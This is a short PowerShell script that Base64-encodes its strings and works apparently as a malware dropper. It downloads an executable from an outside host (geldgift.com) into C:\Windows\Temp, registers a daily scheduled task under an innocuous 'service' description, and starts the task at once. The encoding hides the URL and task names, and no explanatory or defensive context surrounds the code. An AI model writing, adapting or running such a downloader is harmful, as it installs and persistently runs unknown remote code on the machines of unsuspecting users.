$A1 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Sm9ybWVuZ2FuZHJUYXNr"))
$B2 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("QzpcVGVtcFxzZXJ2aWNlLmV4ZQ=="))
$C3 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("MTM6Mzc="))
$D4 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Sm9ybXVuZ2FuZCBUYXNrIHRvIHJ1biBzZXJ2aWNlIGV4ZWN1dGFibGU="))

$E5 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly9nZWxkZ2lmdC5jb20vc2VydmljZS5leGU="))
$F6 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("QzpcV2luZG93c1xUZW1wXHNlcnZpY2UuZXhl"))

$G7 = $E5
$H8 = $F6

try {
    Invoke-WebRequest -Uri $G7 -OutFile $H8
} catch {
    exit 1
}

$I9 = New-ScheduledTaskAction -Execute $H8
$J10 = New-ScheduledTaskTrigger -Daily -At $C3
$task1 = Register-ScheduledTask -TaskName $A1 -Action $I9 -Trigger $J10 -Description $D4

Start-ScheduledTask -TaskName $A1
